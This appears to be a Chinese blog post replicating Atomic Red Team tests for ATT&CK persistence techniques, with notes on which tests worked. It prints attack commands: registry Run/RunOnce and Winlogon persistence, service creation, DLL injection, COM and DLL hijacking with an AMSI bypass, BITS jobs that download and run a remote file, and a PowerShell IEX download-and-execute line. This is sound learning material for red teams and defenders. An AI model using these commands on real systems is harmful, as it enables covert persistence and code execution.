---
layout: post
title: 跟着ATT&CK学安全之persistence
excerpt: "跟着ATT&CK学安全之persistence"
categories: [ATT&CK]
comments: true
---
### T1015 - Accessibility Features
windows包含了一些不可见的特性,当使用登陆后使用组合键可以触发他们.红队可以修改启动他们的方式,从而在没有登陆系统的情况下获取命令行.

两个常见的程序是`C:\Windows\System32\sethc.exe`和`C:\Windows\System32\sethc.exe`,连续使用shift五次和`Windows + U `打开设置

其他的快捷键如下
- On-Screen Keyboard: C:\Windows\System32\osk.exe
- Magnifier: C:\Windows\System32\Magnify.exe
- Narrator: C:\Windows\System32\Narrator.exe
- Display Switcher: C:\Windows\System32\DisplaySwitch.exe
- App Switcher: C:\Windows\System32\AtBroker.exe

这个复现没有通过
### T1103 - AppInit DLLs
AppInit_Dlls键值位于注册表 `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows or HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows`下面，相对于其他的注册表启动项来说，这个键值的特殊之处在于任何使用到User32.dll 的EXE、DLL、OCX等类型的PE文件都会读取这个地方，并且根据约定的规范将这个键值下指向的DLL文件进行加载，加载的方式是调用 LoadLibrary。红队可以使用它加载恶意的dll从而实现persistence和privilege escalation

**AppInit DLL方法在win8和之后的版本已经不能使用了(当secure boot开启的时候)**
###### 测试1 Install AppInit Shim
```
reg.exe import T1103.reg
```
检测的话,查看注册表就行

win10上成功复现
### T1138 - Application Shimming
The Microsoft Windows Application Compatibility Infrastructure/Framework(应用兼容基础框架)是用来做操作系统代码向下兼容的,例如它允许开发者修改为windowsxp创建的应用程序以便它在win10上继续使用.shims在操作系统和应用之间充当一个缓冲的角色,当程序运行的时候,shims 缓存决定程序是否需要shim database (.sdb),如果需要,shim将使用Hooking技术(https://attack.mitre.org/techniques/T1179)重定向代码以便与操作系统的通信,shims的默认安装位置如下
- `%WINDIR%\AppPatch\sysmain.sdb`
- `hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb`
databases存储的位置如下
- `%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom`
- `hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom`

为了保证shims安全,shims运行在用户模式下,并且你需要使用adminstrator权限来运行它.shims可以用来bypass UAC,向进程中注入dll.禁止 Data Execution Prevention和Structure Exception Handling和获取内存数据.向Hooking一样,利用shims可以让红队权限提升,安装后门,关闭windows防护功能等等.
###### 测试1 Application Shim Installation
```
sdbinst.exe D:\pycharmproject\atomic-red-team-master\atomics\T1138\src\AtomicShimx86.sdb
sdbinst.exe -u D:\pycharmproject\atomic-red-team-master\atomics\T1138\src\AtomicShimx86.sdb
```
有效果,但是不知道是干啥的
### T1050 - New Service
当操作系统启动的时候,他们可以通过服务来运行程序或应用.服务的配置信息存储在注册表中.

红队可以通过修改注册表或者使用工具集来修改配置进行服务安装.服务可以由administrator创建但是运行后拥有system权限.红队也可以使用Service Execution来直接运行服务
###### 测试1,创建一个新的服务
```
sc.exe create #{service_name} binPath= #{binary_path}
sc.exe start #{service_name}
```
就是
```
sc.exe create mortytest binPath= E:\pythonProject\atomic-red-team\atomics\T1050\bin\AtomicService.exe
sc.exe start mortytest
```
运行后进程中仍可以看到AtomicService.exe

清除痕迹
```
sc.exe stop mortytest
sc.exe delete mortytest
```
win10成功复现
###### 测试2 Service Installation PowerShell Installs A Local Service using PowerShell
安装服务
```
New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}"
Start-Service -Name "#{service_name}"
```
也就是
```
New-Service -Name "mortytest" -BinaryPathName "E:\pythonProject\atomic-red-team\atomics\T1050\bin\AtomicService.exe"
Start-Service -Name "mortytest"
```
运行后进程中仍可以看到AtomicService.exe

清除
```
Stop-Service -Name "mortytest"
(Get-WmiObject Win32_Service -filter "name='mortytest'").Delete()
```
win10成功复现
### T1100 - Web Shell
通过使用webshell来维持控制,demo略

win10成功复现
### T1179 - Hooking
###### 测试1 Hook PowerShell TLS Encrypt/Decrypt Messages
```
mavinject $pid /INJECTRUNNING C:\Users\john\Desktop\T1179x64.dll
curl https://www.baidu.com
```
win10成功复现
### T1062 - Hypervisor
虚拟机
###### 测试1 Installing Hyper-V Feature
使用powershell来检查Hyper-v是否被安装,如果已经安装,就创建虚拟机,通常使用rootkit来隐藏
```
Get-WindowsFeature -Name Hyper-V -ComputerName #{hostname}
Install-WindowsFeature -Name Hyper-V -ComputerName #{hostname} -IncludeManagementTools
New-VM -Name #{vm_name} -MemoryStartupBytes 1GB -NewVHDPath #{file_location} -NewVHDSizeBytes 21474836480
```
这个应该可以
### Valid Accounts
通过已有的账号来维持控制

这个没法复现
### T1176 - Browser Extensions
有些恶意软件是通过浏览器扩展的形式贮存在客户端上,而这些恶意

###### 测试1 Chrome (Developer Mode)
1. 打开chrome://extensions 并选择开发者模式
2. 加载已解压的扩展程序

win10成功复现
##### 测试2 Chrome (Chrome Web Store)
1. 在chrome中打开`https://chrome.google.com/webstore/detail/minimum-viable-malicious/odlpfdolehmhciiebahbpnaopneicend`
2. 点击'Add to Chrome'

win10成功复现
##### 测试3 FireFox
1. Navigate to about:debugging and click "Load Temporary Add-on"
2. Navigate to manifest.json
3. Then click 'Open'

其中manifest.json
```
{
  "name": "Minimum Viable Malicious Extension",
  "description": "Base Level Extension",
  "version": "1.0",
  "manifest_version": 2,
  "content_scripts": [
    {
      "matches": [
        "<all_urls>"
      ],
      "js": [
        "inline.js"
      ]
    }
  ]
}
```
win10成功复现
### T1156 - .bash_profile and .bashrc
当一个新的shell打开或者用户登录的时候,`~/.bash_profile`和`~/.bashrc`会运行,其中每次打开一个新shell,`.bashrc`就会运行一次
###### 测试1 Add command to .bash_profile
```bash
echo "#{command_to_add}" >> ~/.bash_profile
```
成功复现(root登录账户的条件下)
##### 测试2 Add command to .bashrc
```bash
echo "#{command_to_add}" >> ~/.bashrc
```
成功复现
### T1197 - BITS Jobs
windows后台智能传输服务(BITS)是一个通过Component Object Model (COM)的低带宽,同步文件传输的服务.BITS是一个用来更新,传输信息和其他应用后台操作并且不会干扰其他应用网络.我们可以通过powershell和BITSAdmin来创建BITS jobs

红队可以使用BITS来下载,运行恶意代码,甚至清除这些恶意代码.BITS运行不需要新建文件或者修改注册表,而且没有防火墙的拦截
###### 测试1 Download & Execute
```
bitsadmin.exe /transfer /Download /priority Foreground http://snappyzz.com/calc.calc D:\bitsadmin_flag.ps1
```
win10 下载成功复现,运行没有成功复现
###### 测试2 Download & Execute via PowerShell BITS
```
Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}
```
win10 下载成功复现,运行没有成功复现
###### 测试3 Persist, Download, & Execute
```
bitsadmin.exe /create AtomicBITS
bitsadmin.exe /addfile AtomicBITS http://snappyzz.com/calc.calc E:\bitsadmin_flag.ps1
bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe E:\bitsadmin_flag.ps1
bitsadmin.exe /complete AtomicBITS
bitsadmin.exe /resume AtomicBITS
```
没有成功复现
### T1158 - Hidden Files and Directories
为了防止用户移动一些特定的文件,操作系统会提供一个'隐藏'的概念,用户需要设置之后才能在桌面看到或者使用`dir /a`或者是linux中的`ls -a`.红队可根据这个来隐藏文件

对于windows,用户可以使用attrib.exe来隐藏文件,简单的使用`attrib +h filename`来隐藏文件,使用`+s`标识系统文件,使用`+r`标识只读,使用`\S`递归
### T1122 - Component Object Model Hijacking
Component Object Model (COM)是windows中用来进行软甲交互的系统.红队可以通过劫持com的手段使用它来向合法的程序插入恶意代码
###### 测试1 Component Object Model Hijacking
通过certutil.exe劫持COM Object
```
reg import COMHijack.reg
certutil.exe -CAInfo
```
清除
```
reg import PathToAtomicsFolder\T1122\src\COMHijackCleanup.reg
```
**没有复现成功**
### T1038 - DLL Search Order Hijacking
windows系统使用一个通常的方法寻找dlls并加载它.红队可以利用windows加载dll的顺序加载恶意的dll来提升权限或者persistence,原理就是在特定的地方放置dll,然后恶意的dll取成正常的名字,然后被优先加载.通常是放在当前目录下
###### 测试1 DLL Search Order Hijacking - amsi.dll
红队可以使用powershell加载不安全的库来绕过AMSI(反病毒接口检查)
```
copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
%APPDATA%\updater.exe -Command exit
```
这个例子只是说明powershell在当前目录下优先被加载

win10成功复现
### T1004 - Winlogon Helper DLL
Winlogon.exe是windows负责注册和注销的组件.它的位置在注册表的`HKLM\Software\[Wow6432Node\]Microsoft\Windows NT\CurrentVersion\Winlogon\`和`HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`,它用来管理支持Winlogon的额外的程序和方法,修改这些注册表的键可以造成Winlogon加载恶意的程序,如下的这些子键有危害
- Winlogon\Notify - points to notification package DLLs that handle Winlogon events
- Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on
- Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on
###### 测试1 Winlogon Shell Key Persistence - PowerShell
```
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, C:\Windows\System32\cmd.exe" -Force
```
win10成功复现
###### 测试2 Winlogon Userinit Key Persistence - PowerShell
```
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, C:\Windows\System32\cmd.exe" -Force
```
**没有成功复现**
###### 测试3 Winlogon Notify Key Logon Persistence - PowerShell

### T1060 - Registry Run Keys / Startup Folder
在注册表的一些键值和startup文件夹下添加指向的程序,可以使用户登陆的时候程序运行.windows注册表默认运行的位置在

- HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
- HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
- HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
- HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`也可以但是这个键默认没有.我们可以使用RunOnceEx中的Depend键来加载dll`reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"`

如下的这些键可以用来设置启动文件夹的persistence
- HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
- HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders

如下的这些键可以设置服务的自启动

- HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
- HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
- HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices
- HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices

还有如下

- HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
- HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

还有
- HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
- HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell

还有`HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows`

`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager`

红队通过配置这些位置来persistence,红队还可以使用Masquerading来使他们看起来像是一个合法的程序
###### 测试1 Reg Key Run
```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
```
清除
```
REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /f
```
迎还没问题,没有复现
###### 测试2 Reg Key RunOnce
```
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "#{thing_to_execute}"
```
Cleanup Commands:
```
REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f
```
迎还没问题,没有复现
###### 测试3 PowerShell Registry RunOnce
powershell中运行
```
$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
```
清除
```
Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
```
迎还没问题,没有复现
### T1137 - Office Application Startup